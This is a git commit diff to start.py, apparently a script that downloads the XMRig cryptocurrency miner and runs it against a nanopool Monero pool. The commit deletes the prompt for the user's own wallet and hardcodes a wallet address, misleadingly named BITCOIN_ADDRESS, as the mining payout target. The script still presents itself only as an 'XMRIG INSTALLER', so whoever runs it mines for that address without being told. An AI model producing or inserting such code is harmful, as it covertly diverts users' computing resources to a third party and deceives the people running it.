78707b5f3e60d8e0e514f6ff658aae4f42ccb7f1
Cr0mb <137664526+Cr0mb@users.noreply.github.com>
2025-02-22 18:04:20 -0600

    Update start.py

--- start.py
+++ start.py
@@ -6,12 +6,10 @@ import requests
 URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
 FILENAME = "xmrig-6.22.2-linux-static-x64.tar.gz"
 EXTRACTED_DIR = "xmrig-6.22.2"
+BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
+
 print("Made by Cr0mb")
 print("\n     XMRIG INSTALLER")
-xmr_wallet = input("Enter your XMR wallet address: ")
-if not xmr_wallet:
-    print("Wallet address is required.")
-    exit(1)
 
 print("Downloading XMRig...")
 response = requests.get(URL, stream=True)
@@ -31,6 +29,6 @@ print("Starting XMRig...")
 subprocess.run([
     "./xmrig",
     "-o", "xmr-us-east1.nanopool.org:14433",
-    "-u", xmr_wallet,
+    "-u", BITCOIN_ADDRESS,
     "--tls", "--coin", "monero"
 ])
